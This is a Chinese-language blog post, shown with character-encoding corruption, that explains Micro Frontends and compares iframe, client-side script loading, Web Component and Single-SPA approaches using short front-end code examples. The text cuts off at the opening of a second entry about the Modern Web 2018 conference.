ç›´åˆ°æœ€è¿‘å·¥ä½œä¸Šæ¥è§¸åˆ°çš„æ¡†æ¶ï¼Œä¼¼ä¹ä¹Ÿæƒ³è®“é é¢ä¸Šçš„å…ƒä»¶æ›´åŠ ä½è€¦åˆï¼Œç”šè‡³æ˜¯å¸Œæœ›èƒ½æ”¯æ´é‹è¡Œä¸åŒç‰ˆæœ¬æˆ–æ˜¯ tech stack çš„å…ƒä»¶ï¼Œæ‰è®“æˆ‘åˆå†æƒ³èµ· Micro Frontends é€™å€‹æ±è¥¿ï¼Œæ‰€ä»¥æŸ¥äº†é»è³‡æ–™ï¼Œé€™é‚Šåšå€‹ç´€éŒ„åˆ†äº«ã€‚
ä»€éº¼æ˜¯ Micro Frontendså¤§éƒ¨åˆ†æŸ¥åˆ°çš„æ–‡ç« éƒ½æœ‰æåˆ°ï¼ŒMicro Frontends æœ€æ—©å‡ºç¾åœ¨ 2016 å¹´ ThoughtWorks é€™é–“å…¬å¸å…¬ä½ˆçš„æŠ€è¡“é›·é”ä¸­ï¼Œä¸¦åœ¨ 2018 å¹´äº”æœˆé€²å…¥è©¦é©—éšæ®µï¼Œä»£è¡¨ä»–å€‘èªç‚ºé€™å€‹æ¶æ§‹æ˜¯æœ‰ç™¼å±•æ·ºåŠ›çš„ã€‚ï¼ˆæŸ¥äº†ä¸€ä¸‹ wikiï¼ŒThoughtWorks æ˜¯ä¸€é–“è »å¤§çš„å…¨çƒè»Ÿé«”é¡§å•å…¬å¸ï¼Œæœ‰è‡ªå·±çš„ç”¢å“ï¼Œä¹Ÿæœƒç‚ºå®¢æˆ¶åˆ¶å®šå„ç¨®å‰ç»è»Ÿé«”è¨­è¨ˆï¼‰
è¦è§£é‡‹ Micro Frontendsï¼Œå¯ä»¥å…ˆå¾ Microservices è¬›èµ·ã€‚
Microservices åœ¨å¾Œç«¯çš„ä¸–ç•Œè£¡é¢å·²ç¶“é‹è¡Œå¤šå¹´ï¼Œæ¡ç”¨ Microservices çš„åœ˜éšŠæ¶æ§‹é€šå¸¸éƒ½æ˜¯å¦‚ä¸‹åœ–æ‰€ç¹ªï¼š

å¾Œç«¯ä¸­æ¯å€‹ Microservices å½¼æ­¤ä¹‹é–“ç¨ç«‹ä½œæ¥­ï¼Œå„å€‹åœ˜éšŠå¯ä»¥æ“æœ‰è‡ªå·±çš„éƒ¨ç½²èˆ‡é–‹ç™¼æŠ€è¡“ï¼Œæºé€šå¯ä»¥é€éå„æ¨£ API ä»‹é¢ä¾†é”æˆï¼Œèˆ‡å‰ç«¯ä¹‹é–“ä¹Ÿåªéœ€è¦ HTTP request å³å¯é€²è¡Œå„ç¨®æœå‹™ä¸²æ¥ã€‚
åœ¨é€™æ¨£çš„æ¶æ§‹ä¸‹ï¼ŒFrontend team çš„ç¨‹å¼ç¢¼å»é‚„æ˜¯éƒ½å…±å­˜åœ¨ä¸€å€‹ Monolithic çš„çµæ§‹å…§ï¼Œç•¶ç¶²ç«™åŠŸèƒ½è¶Šè¶¨è¤‡é›œã€åœ˜éšŠæˆé•·èŒå£¯å¾Œï¼Œæ•´å€‹å‰ç«¯æ¶æ§‹å°±æœƒè¶Šä¾†è¶Šé›£ä»¥ç¶­è­·ï¼Œæ›´åˆ¥æå‰ç«¯æŠ€è¡“çš„æ—¥æ–°æœˆç•°ï¼Œå¾ˆå®¹æ˜“æœƒç”¢ç”Ÿ legacy codeï¼Œé€™æ™‚è‹¥æƒ³è¦æ›´æ–°å°±éº»ç…©äº†ã€‚
ç”±æ–¼æ…¢æ…¢æœ‰äººé«”æœƒåˆ°é€™ç¨®å•é¡Œï¼ŒMicro Frontends çš„æƒ³æ³•æ‰è¢«æå‡ºï¼š

å¾åœ–ä¸­ä¸é›£ç™¼ç¾ï¼ŒFrontend çš„æ¨¡çµ„è¢«æ‹†åˆ†è‡³å„å€‹ team ä¸­ï¼Œæ¯å€‹åœ˜éšŠç¨ç«‹æŒç®¡è‡ªå·±çš„å‰å¾Œç«¯æœå‹™ï¼Œæ“æœ‰è‡ªå·±çš„éƒ¨ç½²ç’°å¢ƒèˆ‡ tech stackï¼Œåœ˜éšŠé–“ä½è€¦åˆï¼Œåœ˜éšŠä¸­é«˜å…§èšã€‚æ­¤å¤–ï¼Œæ¯å€‹åœ˜éšŠç”¢å‡ºçš„å‰ç«¯æ¨¡çµ„ï¼Œè¦èƒ½å¤ æœ‰æ•ˆçš„ã€æ‹¼è²¼ã€åœ¨åŒä¸€å€‹ SPA é é¢ç•¶ä¸­ï¼Œä¿æŒä½¿ç”¨è€…åœ¨ç”¢å“çš„é«”é©—ä¸Šèˆ‡åŸå…ˆçš„ SPA ä¸€è‡´ã€‚
åœ¨ micro-frontends.org é€™å€‹ç¶²ç«™ä¸­èªªåˆ°ï¼Œé€™æ¨£çš„çµæ§‹å°±ç®—æ˜¯ Micro Frontendsï¼Œè€Œé€™æ¨£çš„æ¦‚å¿µå…¶å¯¦æ›´æ—©ä¹‹å‰å°±æœ‰ï¼Œåªæ˜¯æœ‰åˆ¥çš„åç¨±ï¼Œåˆ†åˆ¥å«åš Frontend Integration for Verticalised Systems èˆ‡ Self-contained Systemsã€‚
ä½†æˆ‘è‡ªå·±èªç‚ºï¼ŒMicro frontend æ‡‰è©²ä¸»è¦è‘—é‡åœ¨ï¼šå¦‚ä½•å°‡å‰ç«¯é é¢ä¸­ä»¥åŠŸèƒ½æ¨¡çµ„ä¾†æ‹†åˆ†æˆä¸åŒç¨ç«‹æ‡‰ç”¨ï¼Œä¸¦é»è²¼å…±å­˜åœ¨åŒå€‹ SPA ä¸­ã€‚(å¾Œé¢æœƒå†æåˆ°ç›®å‰å¸¸è¦‹çš„å¯¦ä½œæ–¹å¼ã€‚)
è€Œç”± Micro Frontends èˆ‡ Micro Services æ‰€çµ„æˆçš„ä¸€å€‹å¾ UIã€å•†æ¥­é‚è¼¯ã€è³‡æ–™è™•ç†å’Œç³»çµ±éƒ¨ç½²ï¼Œé€™æ¨£å®Œæ•´çš„ç¨ç«‹æœå‹™ï¼Œæ‰ç®—æ˜¯ä¸€å€‹ SCS - Self contain systemã€‚
Micro Frontends çš„æ ¸å¿ƒæ€æƒ³
Be Technology Agnosticï¼šæ¯å€‹åœ˜éšŠå¯ä»¥ä½¿ç”¨è‡ªå·±çš„æŠ€è¡“çµæ§‹ä¾†é–‹ç™¼å‰ç«¯æ¨¡çµ„ï¼Œèˆ‡å…¶ä»–åœ˜éšŠå½¼æ­¤ä¹‹é–“äº’ä¸å¹²æ“¾ï¼Œä¹Ÿç„¡é ˆè€—è²»æˆæœ¬ç›¸äº’å”èª¿ã€‚

Isolate Team Codeï¼šå°±ç®—å„å€‹åœ˜éšŠæ¡ç”¨åŒæ¨£çš„æŠ€è¡“æ¡†æ¶ï¼Œå½¼æ­¤ä¹‹é–“ä¹Ÿä¸è©²å…±äº«è®Šæ•¸æˆ–ç‹€æ…‹ã€‚å½¼æ­¤é–“æ‡‰è©²é€é public API ä¾†æºé€šã€‚

Establish Team Prefixesï¼šåˆ©ç”¨ Prefix çš„æ–¹å¼ä¾†é¿å… CSSã€Browser APIã€Web Eventã€Cookies æˆ– Local Storage çš„è¡çªã€‚

Favor Native Browser Features over Custom APIsï¼šè¦æ•´åˆ Micro Frontends çš„è¤‡é›œåº¦å…¶å¯¦å¾ˆé«˜ï¼Œç•¶æ¯å€‹æ¨¡çµ„é–“éœ€è¦æºé€šæ™‚ï¼Œç›¡é‡æ¡ç”¨ Browser Native API ä¾†å®Œæˆè¼ƒå¥½ï¼›è‹¥çœŸçš„éœ€è¦é¡å¤–çš„æºé€šæ–¹å¼ï¼ˆpub&#x2F;sub systemï¼‰ï¼Œè¦ç›¡é‡ä¿æŒç°¡å–®ã€‚

Build a Resilient Siteï¼šé€é SSI æˆ– PWA çš„æ–¹å¼å¢å¼·ç¶²ç«™çš„ç©©å®šæ€§ï¼Œåœ¨ JS ç„¡æ³•åŸ·è¡Œçš„ç‹€æ³ä¸‹ä¹Ÿæœ‰å ªç”¨çš„å‘ˆç¾ã€‚


Micro Frontends çš„å¯¦ä½œæ–¹æ³•source
æ¥è‘—æˆ‘å€‘å…ˆä¾†çœ‹çœ‹è¦å¦‚ä½•å¯¦ç¾ Micro Frontendsï¼Œé”æˆå¦‚ä¸Šåœ–æ‰€å‘ˆç¾çš„ç‹€æ…‹ï¼Œåœ¨åŒå€‹é é¢ä¸­ï¼Œé‹è¡Œä¸‰å€‹ä¸åŒ Team æ¡ç”¨ä¸åŒ Tech stack çš„æ¨¡çµ„ã€‚
Team checkout èˆ‡ Team inspire å„è‡ªé–‹ç™¼äº†å‰å¾Œç«¯æ•´åˆçš„æ¨¡çµ„ï¼Œè€Œ Team product è¦è² è²¬æ•´åˆå®ƒå€‘ã€‚
ä¸‰å€‹ Team æ¡ç”¨ä¸åŒ tech stackï¼Œä¸¦ä¸”ç¨ç«‹éƒ¨ç½²åœ¨å„è‡ªçš„ç’°å¢ƒä¸­é‹è¡Œï¼ŒåŸºæœ¬ä¸Šå¯èƒ½æœƒæœ‰ä¸‰å€‹ Host åˆ†åˆ¥ serve å®ƒå€‘ï¼š

https://microfrontends-checkout.com/

https://microfrontends-inspire.com/

https://microfrontends-product.com/


æ–¹æ³•ä¸€ï¼šä½¿ç”¨ iframeåœ¨ Team product çš„æ¨¡çµ„ä¸­ï¼Œå¯ä»¥åˆ©ç”¨åµŒå…¥ iframe çš„æ–¹å¼ä¾†è¼‰å…¥å¦å¤–å…©å€‹æ¨¡çµ„ï¼Œç”±æ–¼ iframe å¤©ç”Ÿå°±æœ‰éš”é›¢é‹è¡Œç’°å¢ƒçš„ç‰¹æ€§ï¼Œå„åœ˜éšŠçš„æ¨¡çµ„ç›¸äº’ä¸æœƒå¹²æ“¾ï¼Œè‹¥è¦é€šè¨Šï¼Œåœ¨åŒç¶²åŸŸä¸‹ï¼Œæˆ‘å€‘æ›´èƒ½ç›´æ¥é€é window.postMessage ä¾†é”æˆã€‚
&lt;body&gt;  &lt;!-- in Team Product --&gt;  &lt;iframe width=&quot;100%&quot; height=&quot;200&quot; src=&quot;https://microfrontends-checkout.com/&quot;&gt;&lt;/iframe&gt;  &lt;iframe width=&quot;100%&quot; height=&quot;200&quot; src=&quot;https://microfrontends-inspire.com/&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;

ç¼ºé»:
ä½†ä½¿ç”¨ iframe çš„ç¼ºé»å¾ˆå¤šï¼ŒåŸºæœ¬ä¸Šä¸æœƒæœ‰äººæƒ³æ¡ç”¨é€™ç¨®æ–¹æ³•â€¦åƒæ˜¯ï¼šç”±æ–¼æ‡‰ç”¨æ¨¡çµ„æ˜¯åˆ†é–‹çš„ï¼Œç„¡æ³•å°‡å…±ç”¨çš„ä¾è³´æ¨¡çµ„å–å‡ºä¾†ï¼Œå°è‡´é é¢å¯èƒ½æœƒåŒæ™‚è¼‰å…¥é‡è¤‡çš„ codeï¼›å†è€…ï¼ŒUI çš„å‘ˆç¾ä¸Šä¹Ÿæœƒè®Šå¾—å¾ˆé›£æ§åˆ¶ï¼Œè‹¥æ˜¯å…¶ä¸­é‚„å«æœ‰è¡¨å–®ä¹‹é¡çš„åŠŸèƒ½ï¼Œå°±æ›´éº»ç…©äº†ã€‚
æ–¹æ³•äºŒï¼šåœ¨ Client side ç”¨ JS è¼‰å…¥æ¨¡çµ„function loadPage (element) &#123;  [].forEach.call(element.querySelectorAll(&#x27;script&#x27;), function () &#123;    const script = document.createElement(&quot;script&quot;);    script.setAttribute(&quot;src&quot;, `https://microfrontends-$&#123;element.dataset.url&#125;.com/`);    script.setAttribute(&quot;type&quot;, &quot;text/javascript&quot;);    element.appendChild(script);  &#125;);&#125;document.querySelectorAll(&#x27;.pagelet&#x27;).forEach(loadPage);

&lt;!-- in Team Product --&gt;&lt;div class=&quot;pagelet&quot; data-url=&quot;checkout&quot;&gt;&lt;/div&gt;&lt;div class=&quot;pagelet&quot; data-url=&quot;inspire&quot;&gt;&lt;/div&gt;

ä¹Ÿå°±æ˜¯åœ¨ client side ajax æŠ“å–æ¨¡çµ„ï¼Œå¡å…¥å°æ‡‰çš„ target div å…§ã€‚é€™ç¨®åšæ³•éœ€è¦æ³¨æ„ jsã€css ç­‰çš„è¼‰å…¥é †åºï¼ŒFacebook åœ¨å¤šå¹´å‰æ˜¯ç”¨ BigPipe ä¾†è™•ç†ï¼ˆå¯èƒ½ FB å·²ç¶“æ²’åœ¨ä½¿ç”¨ï¼Œä½†é‚„æ˜¯å¾ˆå€¼å¾—äº†è§£çš„ä¸€å€‹å°ˆæ¡ˆï¼ï¼‰ï¼š
&lt;script type=&quot;text/javascript&quot;&gt;big_pipe.onPageletArrive(&#123;id: â€œpagelet_composerâ€, content=&lt;HTML&gt;, css=[..], js=[..], â€¦&#125;)&lt;/script&gt;

é¡ä¼¼é€™æ¨£ï¼Œç”¨ array ä¾†ä¾åºè¼‰å…¥è³‡æºã€‚
ä½†ç¼ºé»æ˜é¡¯å°±æ˜¯ç„¡æ³• Server-side renderã€‚
æ–¹æ³•ä¸‰ï¼šWeb componenté€™é‚Šæ˜¯æŒ‡ Web standard ä¸‹åŒ…å« Custom Elementã€HTML templateã€Shadow DOM èˆ‡ HTML imports çš„ Web componentã€‚
å„å€‹åœ˜éšŠå¯ä»¥ç”¨è‡ªå·±æƒ³ä½¿ç”¨çš„ tech stack ä¾†è£½ä½œå…ƒä»¶ï¼Œä½†æœ€çµ‚åŒ…è£¹æˆ Web component çš„å½¢å¼ï¼Œä»¥ React ç‚ºä¾‹ï¼š
import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;const SearchComponent = (&#123; children &#125;) =&gt; &#123;  return (    &lt;div&gt;      &lt;p className=&quot;search-component&quot;&gt;&#123;children&#125;&lt;/p&gt;    &lt;/div&gt;  );&#125;;class CustomSearch extends HTMLElement &#123;  connectedCallback() &#123;    const mountPoint = document.createElement(&#x27;span&#x27;);    this.attachShadow(&#123; mode: &#x27;open&#x27; &#125;).appendChild(mountPoint);    const name = this.getAttribute(&#x27;name&#x27;);    const keyword = this.getAttribute(&#x27;keyword&#x27;);    const url = &#x27;https://www.google.com/search?q=&#x27; + encodeURIComponent(name);    ReactDOM.render(      &lt;&gt;        &lt;a href=&#123;url&#125;&gt;&#123;name&#125;&lt;/a&gt;        &lt;SearchComponent&gt;&#123;keyword&#125;&lt;/SearchComponent&gt;      &lt;/&gt;,      mountPoint,    );  &#125;&#125;customElements.define(&#x27;custom-search&#x27;, CustomSearch);

&lt;!-- in Team Product --&gt;&lt;!-- search component from Team Inspire --&gt;&lt;custom-search name=&quot;TeamInspire&quot; keyword=&quot;Micro Frontends&quot;&gt;&lt;/custom-search&gt;

æ¡ç”¨ Web component å¯ä»¥è®“ç¨‹å¼ç¢¼æ¸…æ™°å¯è®€ï¼Œå…ƒä»¶ä¹‹é–“å„è‡ªç¨ç«‹ï¼Œæ‰€æœ‰è³‡æºéƒ½ç”±è‡ªèº«æ§åˆ¶è©²å¦‚ä½•åŠ è¼‰ï¼Œåœ˜éšŠåœ¨ä½¿ç”¨é€™äº›å…ƒä»¶ä¸Šï¼Œå°±å¦‚åŒä¸€èˆ¬ HTML DOMï¼Œä¸¦ä¸”å¯ä»¥ç›´æ¥åˆ©ç”¨ Web Event API ä¾†é€²è¡Œå…ƒé–“é–“çš„æºé€šã€‚ä¾‹å¦‚ï¼š
// in Team checkoutconst event = new CustomEvent(&#x27;buy&#x27;, &#123; item: &#x27;car&#x27; &#125;);window.dispatchEvent(event);

In React:
componentDidMount() &#123;  window.addEventListener(&#x27;buy&#x27;, (event) =&gt; &#123;    this.setState(&#123; buyItem: [...this.state.buyItem, event.item] &#125;);  &#125;, false);&#125;

æ­¤å¤–ï¼Œå¦‚æœ Web component é‚„èƒ½æ­é… SSI (Server Side Includes) ä¾†é”æˆ SSRï¼š
&lt;custom-search keyword=&quot;Micro Frontends&quot;&gt;  &lt;!--#include virtual=&quot;/custom-search?keyword=&quot;Micro Frontends&quot; --&gt;&lt;/custom-search&gt;

server &#123;  listen 3000;  ssi on;  location /TeamInspire &#123;    proxy_pass  https://microfrontends-TeamInspire.com;  &#125;

æ¯å€‹ Micro Frontend team è‡ªå·±è¦å»ºç«‹èµ· component serverï¼Œç”¨ä¾† serve component çš„ markupã€‚ä¸¦ä¸”å¯¦ä½œçš„ Web component æœ¬èº«ä¹Ÿè¦ä¿®æ”¹æˆæ”¯æ´ Server side renderã€‚ä¸éé‡é»æ˜¯ï¼Œé€™æ¨£åœ¨æŠ€è¡“ä¸Šæ˜¯å¯è¡Œçš„ï¼Œè‡³å°‘æ¯”ä¸Šä¸€ç¨®æ–¹å¼å¥½ã€‚
ä½†ç¼ºé»ä¹Ÿå¾ˆæ˜é¡¯ï¼š

éœ€è¦ polyfills ä¾†è£œè¶³ç€è¦½å™¨æ”¯æ´åº¦å•é¡Œã€‚
é›–èªªå¤§å®¶èƒ½ç”¨ä¸åŒ Tech stackï¼Œä½†æœ¬è³ªä¸Šæ¯å€‹åœ˜éšŠæœ€çµ‚é‚„æ˜¯å¾—æƒ³è¾¦æ³•ç”¨æˆçµ±ä¸€çš„ Web component
Web component çš„ç™¼å±•èˆ‡æ™®åŠä¸å¤ å¿«é€Ÿã€‚

é—œæ–¼ Web component å¯¦ä½œ Micro Frontends çš„ç¯„ä¾‹èˆ‡ç´°ç¯€ï¼Œå¤§å®¶å¯ä»¥åˆ° micro-frontends.org çœ‹ï¼Œç¯„ä¾‹ code ç”šè‡³éƒ½åŒ…æˆ dockerï¼Œå¾ˆå¿«å°±èƒ½è£èµ·ä¾†ç©ï¼
æ–¹æ³•å››ï¼šSingle-SPA - javascript metaframeworkCanopyTax é€™é–“å…¬å¸æ¨å‡ºçš„ä¸€å€‹é–‹æºå°ˆæ¡ˆï¼Œæä¾›äº†ä¸€äº›æ–¹ä¾¿çš„ API è®“ä½ é”åˆ°ï¼š

ç”¨å„ç¨®æŠ€è¡“æ§‹å»º micro frontendsã€‚

åœ¨åŒå€‹é é¢ä¸‹ä½¿ç”¨å¤šç¨®å‰ç«¯ framework çµ„æˆçš„æ¨¡çµ„ï¼Œä¸”ç„¡éœ€ refresh pageã€‚

åœ¨ç¾æœ‰çš„æ‡‰ç”¨ä¸­å˜—è©¦æ–°çš„ frameworkï¼Œè€Œä¸å¿…å…¨éƒ¨é‡å¯«ã€‚

æ”¯æ´ Lazy load

æ”¯æ´ Hot reload


æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥å‰å¾€ä»–å€‘çš„ repo çœ‹å„ç¨®ç¯„ä¾‹èˆ‡ç¨‹å¼ç¢¼ã€‚é¡ä¼¼é€™æ¨£çš„ä½¿ç”¨æ–¹å¼ï¼š
import * as singleSpa from &#x27;single-spa&#x27;;const loadingFunction = () =&gt; import(&#x27;./react/react.app.js&#x27;);// å¯æ ¹æ“š route ä¾†åˆ‡åˆ†è¦æ›æˆå“ªå€‹æ¨¡çµ„ä¸¦å‹•æ…‹è¼‰å…¥ç›¸æ‡‰è³‡æºconst activityFunction = location =&gt; location.hash.startsWith(&#x27;#/react-app&#x27;);singleSpa.declareChildApplication(appName, loadingFunction, activityFunction);singleSpa.start();

å…¶ä»–æ–¹æ³•ï¼šåœ¨æŸ¥è³‡æ–™çš„éç¨‹ä¸­ï¼Œå…¶å¯¦å¤§å®¶åœ¨è¨è«–çš„ Micro Frontends éƒ½æœƒè‘—é‡åœ¨å„ Team é–“æ¡ç”¨ä¸åŒ tech stack çš„å‰æï¼Œå¯èƒ½æ˜¯é€™æ¨£æ‰æ¯”è¼ƒå¥½å‡¸é¡¯ Micro Frontends åˆ‡å‰²æ¨¡çµ„çš„æ„Ÿè¦ºã€‚
ä½†æ˜¯å¦‚æœåªæ˜¯æƒ³è¦è®“ Microservices éƒ½æœ‰å„è‡ªå°æ‡‰çš„å‰ç«¯æ¨¡çµ„ï¼Œæˆ‘å€‘å…¶å¯¦ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ React ä¾†å»ºé€ å„é¡å…ƒä»¶åº«ï¼Œè®“ä¸» App ä¸‹è¼‰ä½¿ç”¨ã€‚
é€™æ¨£æœƒæ˜¯ä¸€å€‹æŠ˜è¡·çš„æ–¹æ¡ˆï¼Œä¸ç”¨ç…©æƒ± common dependences çš„å•é¡Œï¼Œä½†ç›¸å°çš„åœ¨å‡ç´šç‰ˆæœ¬æ™‚ï¼Œå¯èƒ½å°±å¾—ä¸€æ¬¡å°‡æ‰€æœ‰å…ƒä»¶åº«å…§çš„å…ƒä»¶éƒ½å‡ç´šæ‰å¯ä»¥ä½¿ç”¨ã€‚
æœ‰é»åé›¢ Micro Frontends çš„æ ¸å¿ƒå°±æ˜¯äº†ã€‚
Micro Frontends å¸¶ä¾†çš„å¥½è™•èˆ‡å£è™•Micro Frontends çš„å¥½è™•å°±åœ¨æ–¼ï¼Œå„å€‹æ¨¡çµ„é–“æ˜¯éå¸¸ç¨ç«‹çš„ï¼Œå½¼æ­¤é–“çš„éƒ¨ç½²ä¸éœ€è¦äº’ç›¸ç­‰å¾…ï¼Œtech stack ä¹Ÿä¸ä¸€å®šè¦ç”¨ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œåœ¨æ±°æ› legacy code çš„éç¨‹å¯ä»¥é †æš¢ä¸€äº›ï¼Œä¹Ÿæ›´å®¹æ˜“å˜—è©¦æ–°æŠ€è¡“ï¼Œå¯ä»¥æ¼¸é€²å¼çš„æŠŠ SPA ä¸Šçš„æ¨¡çµ„æ›¿æ›æˆæ›´å¥½æˆ–æ›´æ–°çš„æ¡†æ¶ï¼Œè®“æ–°èˆŠ code èƒ½å¤ ä¸¦å­˜ç„¡è¡çªã€‚åœ˜éšŠåœ¨é–‹ç™¼ä¸Šå¯ä»¥æ›´æ•æ·ã€‚
ä½†å¯¦å‹™ä¸Šæˆ‘æƒ³æ‡‰è©²ä¸å¤ªæœƒæœ‰äººæƒ³åœ¨åŒå€‹é é¢ä¸ŠåŒæ™‚å­˜åœ¨å¤šç¨®æ¡†æ¶å§ï¼Ÿè©¦æƒ³ï¼Œä¸€å€‹é é¢ä¸Šå¦‚æœåŒæ™‚å­˜åœ¨ React èˆ‡ Vueï¼Œç”šè‡³æ˜¯ Angularï¼Œé€™æ¨£ Page load time å¤§æ¦‚é›£ä»¥æƒ³åƒã€‚å†åŠ ä¸Šç¼ºä¹çµ±ä¸€æ‰“åŒ…çš„æ­¥é©Ÿï¼Œå…±ç”¨è³‡æºçš„ç›¸ä¾æ€§å°±ç„¡æ³•è¢«çŸ¥æ›‰ï¼Œè¦å¦‚ä½•æœ‰æ•ˆè™•ç† Common resources æ˜¯å¾ˆéº»ç…©çš„é›£é¡Œã€‚
é‚„æœ‰å°±æ˜¯ CSS è§£æ±ºæ–¹æ¡ˆï¼Œæœƒä¸æœƒéœ€è¦è™•ç†å‘½åè¡çªï¼Œä¹Ÿæ˜¯ä¸€å€‹éš±æ†‚ã€‚è‹¥æ˜¯å…¬å¸è³‡æºä¸å¤ ï¼Œæ²’æœ‰è¾¦æ³•åˆ©ç”¨åƒ Zeplin ä¹‹é¡çš„å·¥å…·äº†çµ±ä¸€å®šç¾© Style guidelineï¼Œå°±é‚„å¾—æƒ³è¾¦æ³•å”èª¿å„ Team é–‹ç™¼æ¨¡çµ„çš„ style å•é¡Œã€‚
æ•´é«”è€Œè¨€çœ‹èµ·ä¾† Micro Frontends çš„è¤‡é›œåº¦ä¸¦ä¸å°ï¼Œæ‡‰è©²æ¯”è¼ƒé©åˆå¤§å‹æ‡‰ç”¨ï¼Œæˆ–çœŸçš„æœ‰è¨±å¤š Legacy code è¦è™•ç†çš„å…¬å¸åœ˜éšŠã€‚
é‚£æœ‰èª°æ¡ç”¨ Micro Frontendsï¼Ÿå¾ˆå¤šå…¬å¸å¯èƒ½éƒ½æœ‰è‡ªå·±çš„é¡ä¼¼è§£æ±ºæ–¹æ¡ˆï¼Œå°±åƒ FB çš„ bigpieï¼Œæˆ–æ˜¯ Yahoo ä¹Ÿæœ‰é¡ä¼¼çš„ä½œæ³•ã€‚
åœ¨æˆ‘æŸ¥åˆ°çš„è³‡æ–™ç•¶ä¸­ï¼Œæ¯”è¼ƒæœ‰æåˆ° Micro Frontends çš„å¤§å…¬å¸æœ‰ Spotify èˆ‡ IKEAï¼Œç´°ç¯€å°±çµ¦å¤§å®¶è‡ªè¡Œå»æ¬£è³ä»–å€‘çš„åˆ†äº«äº†ï¼š
Spotify - How Spotify Builds Products (Organization. Architecture, Autonomy, Accountability):

Spotify æ˜¯å¾ UI ä¾†å€åˆ†åœ˜éšŠè² è²¬çš„ functionï¼ŒåŸå…ˆæ¡ç”¨ iframe èˆ‡ postMessage çš„æ–¹å¼ä¾†è™•ç† Micro Frontendsï¼Œåœ˜éšŠé–“ technology independenceï¼Œä½†ä»–å€‘å·²ç¶“æ¨æ£„é€™å€‹æ¶æ§‹å¾ˆä¹…äº†ï¼Œå¾Œä¾†æ”¹æ¡ä¸€å¾‹ react&#x2F;redux çš„æ¶æ§‹ã€‚å¯ä»¥çœ‹é€™ä»½ twitter è¨è«–ã€‚
å¦å¤–ï¼Œå®ƒå€‘æ˜¯æœ‰ä¸€å€‹åœ˜éšŠåœ¨è² è²¬æª¢é©—å„ team ç”¢å‡ºçš„æ¨¡çµ„ UI style æ˜¯å¦ç¶­æŒç”¢å“çš„ä¸€è‡´æ€§ã€‚
MICROSERVICE WEBSITES - Gustaf N. Kotte

å°çµè«–å…¶å¯¦æœƒéœ€è¦ç”¨åˆ° Micro Frontends çµæ§‹çš„æ‡‰è©²ä¸å¤šï¼Œå°¤å…¶åœ¨ React&#x2F;Vue&#x2F;Angular ä¸»å®°çš„é€™å¹¾å¹´ï¼Œéœ€æ±‚ç›¸å°æ›´å°‘ã€‚è¶Šå¤§å‹çš„ web app èˆ‡åœ˜éšŠæ‰æ¯”è¼ƒå€¼å¾—å»å˜—è©¦ã€‚
ç¾è¡Œçš„å¯¦ä½œæ–¹å¼å…¶å¯¦éƒ½å¾ˆè¤‡é›œï¼Œä¸Šé¢æè¿°çš„æ–¹æ³•èˆ‡ç¶²è·¯çœ‹åˆ°çš„ prototype éƒ½éæ–¼ç°¡åŒ–äº†ã€‚
ä½†é€™ç¨®é«˜éšå±¤æ¶æ§‹çš„æ€è€ƒèˆ‡è¨­è¨ˆå…¶å¯¦å¤šå¤šç›Šå–„ï¼Œå¾ä¸­ç™¼ç¾çš„å›°é›£æ›´èƒ½æ¨å‹•æŠ€è¡“ç™¼å±•ï¼Œè€Œä¸”ä¹Ÿå¾ˆæœ‰è¶£ï¼
è³‡æ–™ä¾†æº
micro-frontends.org
ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã¯ Micro Frontends ã®å¤¢ã‚’è¦‹ã‚‹ã‹
æŠ€æœ¯é›·è¾¾ä¹‹ã€Œå¾®å‰ç«¯ã€- å°†å¾®æœåŠ¡ç†å¿µæ‰©å±•åˆ°å‰ç«¯å¼€å‘ï¼ˆä¸Šï¼šç†è®ºç¯‡ï¼‰
æŠ€æœ¯é›·è¾¾ä¹‹ã€Œå¾®å‰ç«¯ã€- å°†å¾®æœåŠ¡ç†å¿µæ‰©å±•åˆ°å‰ç«¯å¼€å‘ï¼ˆä¸‹ï¼šå®æˆ˜ç¯‡ï¼‰
Micro Frontends Proof of Concept
Independent micro frontends with Single SPA library
Single-SPA
Spotify - How Spotify Builds Products (Organization. Architecture, Autonomy, Accountability)
MICROSERVICE WEBSITES - Gustaf N. Kotte

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>frontends</tag>
        <tag>micro</tag>
      </tags>
  </entry>
  <entry>
    <title>Modern Web 2018 ç°¡çŸ­å¿ƒå¾—</title>
    <url>/2018/07/20/modern-web-2018/</url>
    <content><![CDATA[å‰è¨€å¾ˆä¹…æ²’åƒåŠ  conference äº†ï¼Œè€Œé€™æ¬¡å‰›å¥½æœ‰æ©ŸæœƒåƒåŠ  Modern Web 2018 ä¸¦ä¸”æ“”ä»»è¬›è€…ä¹‹ä¸€ï¼Œè¶æ©ŸæŠŠèˆ‡æœƒçš„å¿ƒå¾—è¨˜éŒ„ä¸‹ä¾†ä¸¦ä¸”ç°¡å–®ç­†è¨˜ä¸€ä¸‹æˆ‘æœ‰åœ¨è½çš„è­°ç¨‹çš„å¿ƒå¾—ã€‚
ç”±æ–¼é€™ç¯‡åªæ˜¯å€‹äººç°¡çŸ­çš„ç­†è¨˜ä»¥åŠå¿ƒå¾—ï¼Œå¦‚æœæƒ³çœ‹å®Œæ•´è­°ç¨‹çš„å¯ä»¥åˆ°é€™è£¡ï¼Œæˆ–å¦‚æœæƒ³çœ‹æ›´å®Œæ•´çš„ç´€éŒ„ï¼Œä»Šå¹´ä¹Ÿæœ‰å¤§å®¶åœ¨ HackMD ä¸Šå¯«çš„å…±ç­†ï¼šhttps://hackmd.io/c/MW18
